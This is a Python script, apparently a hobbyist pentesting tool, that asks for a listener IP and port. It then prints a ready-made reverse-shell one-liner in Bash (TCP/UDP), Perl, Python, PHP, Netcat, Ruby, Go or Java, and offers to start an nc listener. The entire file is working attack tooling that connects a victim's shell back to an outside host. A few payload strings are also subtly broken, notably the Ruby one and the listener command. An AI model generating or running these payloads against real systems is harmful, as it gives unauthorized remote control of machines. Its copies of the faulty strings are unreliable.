#!/usr/bin/python
import os
import sys
import subprocess
from time import sleep
os.system('clear')

start = "\t\t\t Reverse Shell Generator (By K3nX) "

for i in start:
    print(i,end='')
    sys.stdout.flush()
    sleep(0.03)

ip = input("\nPls enter your listener ip address: ")
port = input("\nPls enter your listener port: ")
choice = input("""
      [1].Bash(TCP)
      [2].Bash(UDP)
      [3].Perl
      [4].Python
      [5].PHP
      [6].Netcat
      [7].Ruby
      [8].Golang
      [9].Java
      [0].Exit
      """)

def bash_tcp():
    bash_tcp = "\nbash -i >& /dev/tcp/"+ip+"/"+port+' '+"0>&1 \n "
    #subprocess.call('clear',shell=True)
    #print ("Bash_TCP Rerverse Shell = " + ' ' + bash_tcp)
    for i in bash_tcp:
       print(i,end='')
       sys.stdout.flush()
       sleep(0.03)
def bash_udp():
    bash_udp = "sh -i >& /dev/udp/"+ip+"/"+port+' '+"0>&1\n "
    #subprocess.call('clear',shell=True)
    #print ("Bash UDP Reverse Shell =  " + ' ' +bash_udp)
    for i in bash_udp:
       print (i,end='')
       sys.stdout.flush()
       sleep(0.03)
def perl():
    perl = ("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n" %(ip,port))
    #subprocess.call('clear',shell=True)
    #print ("Perl Rerverse Shell " + perl)
    for i in perl:
      print (i,end='')
      sys.stdout.flush()
      sleep(0.03)
def python():
    python = ("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'\n" %(ip,port))
    #subprocess.call('clear',shell=True)
    #print ("Python Reverse Shell =  " + ' ' + python)
    for i in python:
      print (i,end='')
      sys.stdout.flush()
      sleep(0.03)
def php():
    php= ("php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n" %(ip,port))
    #subprocess.call('clear',shell=True)
    #print (php)
    for i in php:
      print (i,end='')
      sys.stdout.flush()
      sleep(0.03)
def netcat():
  netcat=("nc -e /bin/sh"+ ' '+ip+' '+port)
  #subprocess.call('clear',shell=True)
  for i in netcat:
    print(i,end='')
    sys.stdout.flush()
    sleep(0.03)
def ruby():
      ruby = ("ruby -rsocket -e'f=TCPSocket.open("+ip+","+port+").to_i;exec sprintf("+"/bin/sh -i+"+"<&%d >&%d 2>&%d,f,f,f"+")'\n")
      #subprocess.call('clear',shell=True)
      for i in ruby:
        print(i,end='')
        sys.stdout.flush()
        sleep(0.03)
def golang():
      golang = ("""echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","%s:%s");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""%(ip,port))
      #subprocess.call('clear',shell=True)
      for i in golang:
          print(i,end='')
          sys.stdout.flush()
          sleep(0.03)
def java():
      java=('''r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()\n''' %(ip,port))
      #subprocess.call('clear',shell=True)
      for i in java:
          print(i,end='')
          sys.stdout.flush()
          sleep(0.03)
def listener():
    listen=input("Are you want to open listener with nc: (y,n)")
    if listen == 'y':
        os.system("nc -lvnp" + port)
    else:
        exit()
def main():
  if choice == '1':
        bash_tcp()
        print("\n")
        listener()
  elif choice == '2':
        bash_udp()
        print("\n")
        listener()
  elif choice == '3':
        perl()
        print("\n")
        listener()
  elif choice == '4':
        python()
        print("\n")
        listener()
  elif choice == '5':
        php()
        print("\n")
        listener()
  elif choice == '6':
        netcat()
        print("\n")
        listener()
  elif choice == '7':
        ruby()
        print("\n")
        listener()
  elif choice == '8':
        golang()
        print("\n")
        listener()
  elif choice == '9':
        java()
        print("\n")
        listener()
  elif choice == '0':
        exit()
  else:
    print("Pls enter the valid entry")
if __name__ == "__main__":main()
